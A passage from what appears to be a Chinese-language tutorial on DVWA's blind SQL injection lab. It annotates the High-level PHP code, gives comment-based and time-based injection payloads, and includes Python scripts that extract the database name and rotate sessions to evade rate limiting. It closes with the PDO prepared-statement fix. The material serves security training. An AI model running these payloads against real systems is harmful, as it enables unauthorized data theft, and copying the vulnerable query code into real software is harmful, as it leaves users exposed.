class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 限流机制 ★★★</span></span><br><span class="line">    <span class="comment">// 每次请求增加计数</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：限制不够严格 ★★★</span></span><br><span class="line">    <span class="comment">// 只是在特定次数后暂停1秒</span></span><br><span class="line">    <span class="comment">// 攻击者可以通过：</span></span><br><span class="line">    <span class="comment">// 1. 清除Session</span></span><br><span class="line">    <span class="comment">// 2. 使用多个Session</span></span><br><span class="line">    <span class="comment">// 3. 忍受延迟继续攻击</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] &gt; <span class="number">3</span> ) &#123;</span><br><span class="line">        <span class="comment">// 暂停1秒（轻微的速率限制）</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用mysqli_real_escape_string()转义</span></span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ?</span><br><span class="line">           <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> ) :</span><br><span class="line">           ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进3：添加LIMIT 1 ★★★</span></span><br><span class="line">    <span class="comment">// LIMIT 1 - 只返回一行结果</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 目的：限制结果数量</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 不能防止SQL注入</span></span><br><span class="line">    <span class="comment">// 2. 攻击者仍可以使用盲注</span></span><br><span class="line">    <span class="comment">// 3. 可以使用UNION绕过（在某些情况下）</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 改进4：重置Session计数 ★★★</span></span><br><span class="line">        <span class="comment">// 查询失败后重置</span></span><br><span class="line">        <span class="comment">// 但这实际上帮助了攻击者（可以无限尝试）</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HTML部分（JavaScript设置Cookie）：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return setCookie();&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        User ID:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">size</span>=<span class="string">&quot;15&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 使用JavaScript设置Cookie ★★★</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> id = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;form1&quot;</span>][<span class="string">&quot;id&quot;</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 设置Cookie</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// path=/ - Cookie对整个网站有效</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;id=&quot;</span> + id + <span class="string">&quot;; path=/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 重新加载页面，触发PHP处理Cookie</span></span></span><br><span class="line"><span class="language-javascript">    location.<span class="title function_">reload</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 防止表单提交</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>使用Cookie</strong> - 数据通过Cookie传递</li>
+<li><strong>Session计数</strong> - 限制尝试次数</li>
+<li><strong>添加LIMIT</strong> - 限制查询结果</li>
+<li><strong>速率限制</strong> - sleep()延迟</li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>仍是字符串拼接</strong> - 有单引号，但仍可注入</li>
+<li><strong>限流太弱</strong> - 只延迟1秒，可以忍受</li>
+<li><strong>Session可重置</strong> - 清除Cookie重新开始</li>
+<li><strong>LIMIT不防注入</strong> - 可以用注释绕过</li>
+</ol>
+<p><strong>LIMIT绕过：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 原始查询</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注释掉LIMIT</span></span><br><span class="line">$id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; --</span></span><br><span class="line"><span class="string">结果：SELECT * FROM users WHERE user_id = &#x27;</span><span class="number">1</span><span class="string">&#x27; --&#x27;</span> LIMIT <span class="number">1</span>;</span><br><span class="line">简化：<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 或使用#</span></span><br><span class="line">$id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; #</span></span><br><span class="line"><span class="string">结果：SELECT * FROM users WHERE user_id = &#x27;</span><span class="number">1</span><span class="string">&#x27; #&#x27;</span> LIMIT <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：注释绕过LIMIT"><a href="#方法1：注释绕过LIMIT" class="headerlink" title="方法1：注释绕过LIMIT"></a>方法1：注释绕过LIMIT</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用--注释</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用#注释</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 #</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：容忍速率限制"><a href="#方法2：容忍速率限制" class="headerlink" title="方法2：容忍速率限制"></a>方法2：容忍速率限制</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Session（保持Cookie）</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;security&#x27;</span>, <span class="string">&#x27;high&#x27;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="string">&#x27;your_session&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_condition</span>(<span class="params">condition</span>):</span><br><span class="line">    payload = <span class="string">f&quot;1&#x27; AND <span class="subst">&#123;condition&#125;</span> --&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置Cookie</span></span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;id&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    response = session.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># High难度可能有延迟，需要更长超时</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继续盲注（虽然慢，但可行）</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_condition(<span class="string">f&quot;(SELECT SUBSTRING(database(),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span>):</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 增加延迟以适应限流</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：使用多个Session绕过限流"><a href="#方法3：使用多个Session绕过限流" class="headerlink" title="方法3：使用多个Session绕过限流"></a>方法3：使用多个Session绕过限流</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当一个Session被限流，切换到另一个</span></span><br><span class="line">sessions = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.cookies.<span class="built_in">set</span>(<span class="string">&#x27;security&#x27;</span>, <span class="string">&#x27;high&#x27;</span>)</span><br><span class="line">    s.cookies.<span class="built_in">set</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="string">f&#x27;session_<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    sessions.append(s)</span><br><span class="line"></span><br><span class="line">current_session = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_with_rotation</span>(<span class="params">condition</span>):</span><br><span class="line">    <span class="keyword">global</span> current_session</span><br><span class="line">    session = sessions[current_session]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每3次请求切换Session</span></span><br><span class="line">    <span class="keyword">if</span> current_session % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        current_session = (current_session + <span class="number">1</span>) % <span class="built_in">len</span>(sessions)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用当前Session检查</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：时间盲注（不受LIMIT影响）"><a href="#方法4：时间盲注（不受LIMIT影响）" class="headerlink" title="方法4：时间盲注（不受LIMIT影响）"></a>方法4：时间盲注（不受LIMIT影响）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 时间盲注不受LIMIT限制</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --</span></span><br><span class="line"><span class="string">响应慢 → 注入成功</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 提取数据</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span>, SLEEP(<span class="number">3</span>), <span class="number">0</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用PDO预编译语句，真正安全。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：验证Anti-CSRF token ★★★</span></span><br><span class="line">    <span class="comment">// checkToken() - 验证CSRF token</span></span><br><span class="line">    <span class="comment">// 防止跨站请求伪造</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：输入验证 ★★★</span></span><br><span class="line">    <span class="comment">// is_numeric() - 检查是否为数字</span></span><br><span class="line">    <span class="comment">// 如果不是数字，直接拒绝</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 这是白名单验证：只接受数字</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 核心防护：PDO预编译语句 ★★★</span></span><br><span class="line">        <span class="comment">// $db - PDO数据库连接对象</span></span><br><span class="line">        <span class="comment">// prepare() - 准备SQL语句</span></span><br><span class="line">        <span class="comment">// :id - 命名参数占位符</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 原理：</span></span><br><span class="line">        <span class="comment">// 1. SQL结构和数据完全分离</span></span><br><span class="line">        <span class="comment">// 2. 参数永远不会被当作SQL代码执行</span></span><br><span class="line">        <span class="comment">// 3. 数据库引擎知道:id是数据，不是代码</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 绑定参数 ★★★</span></span><br><span class="line">        <span class="comment">// bindParam() - 将变量绑定到参数</span></span><br><span class="line">        <span class="comment">// PDO::PARAM_INT - 参数类型为整数</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 作用：</span></span><br><span class="line">        <span class="comment">// 1. 明确指定参数类型</span></span><br><span class="line">        <span class="comment">// 2. 防止类型混淆攻击</span></span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 执行查询 ★★★</span></span><br><span class="line">        <span class="comment">// execute() - 执行预编译语句</span></span><br><span class="line">        <span class="comment">// 此时才真正执行SQL</span></span><br><span class="line">        <span class="comment">// 参数值被安全地插入</span></span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 获取结果 ★★★</span></span><br><span class="line">        <span class="comment">// fetch() - 获取一行结果</span></span><br><span class="line">        <span class="comment">// 如果没有结果，返回false</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// ★★★ 改进3：显示具体数据 ★★★</span></span><br><span class="line">            <span class="comment">// 因为已经完全安全，可以显示数据</span></span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;First name: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Surname: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 输入不是数字，直接拒绝 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Invalid input: must be numeric&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 生成新的CSRF token ★★★</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
+<ol>
+<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
+<li><strong>输入验证</strong> - is_numeric()白名单</li>
+<li><strong>PDO预编译</strong> - SQL结构和数据分离</li>
+<li><strong>参数类型绑定</strong> - PDO::PARAM_INT</li>
+<li><strong>LIMIT限制</strong> - 防止返回过多数据</li>
+</ol>
+<p><strong>PDO预编译工作原理：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">传统拼接（不安全）:</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="variable">$id</span>&#x27;&quot;</span>;</span><br><span class="line">↓</span><br><span class="line">攻击：<span class="variable">$id</span> = <span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">↓</span><br><span class="line">结果：SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span> = <span class="string">&#x27;1&#x27;</span> OR <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">↓</span><br><span class="line">SQL注入成功！</span><br><span class="line"></span><br><span class="line">PDO预编译（安全）:</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT * FROM users WHERE id = :id&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;bindParam(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">↓</span><br><span class="line">攻击：<span class="variable">$id</span> = <span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">↓</span><br><span class="line">PDO处理：将<span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>作为整数0</span><br><span class="line">或拒绝（不是有效整数）</span><br><span class="line">↓</span><br><span class="line">SQL注入失败！</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被阻止：</strong></p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">攻击<span class="number">1</span>：<span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span class="number">2</span>：<span class="number">1</span> <span class="variable"><span class="keyword">OR</span></span> <span class="number">1</span>=<span class="number">1</span></span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝（包含空格）</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span class="number">3</span>：<span class="number">1</span></span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">True</span></span></span></span><br><span class="line"><span class="function"><span class="variable">PDO</span> → 安全执行</span></span><br><span class="line"><span class="function">结果：正常查询，无法注入</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span class="number">4</span>：<span class="number">1</span>; <span class="variable">DROP</span> <span class="variable">TABLE</span> <span class="variable">users</span>; --</span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>() → <span class="variable"><span class="literal">False</span></span> → 拒绝</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击<span 